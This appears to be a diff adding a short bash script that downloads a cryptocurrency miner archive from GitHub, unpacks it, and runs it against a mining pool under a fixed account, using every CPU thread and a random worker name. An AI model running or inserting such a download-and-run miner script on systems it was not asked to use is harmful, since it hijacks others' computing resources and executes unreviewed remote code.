@@ -1,0 +1,5 @@
+#!/bin/bash
+wget https://github.com/apool-io/apoolminer/releases/download/v2.8.4/apoolminer_linux_qubic_autoupdate_v2.8.4.tar.gz
+tar xf apoolminer_linux_qubic_autoupdate_v2.8.4.tar.gz
+cd apoolminer_linux_qubic_autoupdate_v2.8.4
+./apoolminer --algo qubic --gpu-off --pool qubic1.hk.apool.io:3334 --account CP_jf0ixh8hgm --worker $(echo $(shuf -i 1-15000 -n 1)-C) --thread $(nproc --all)
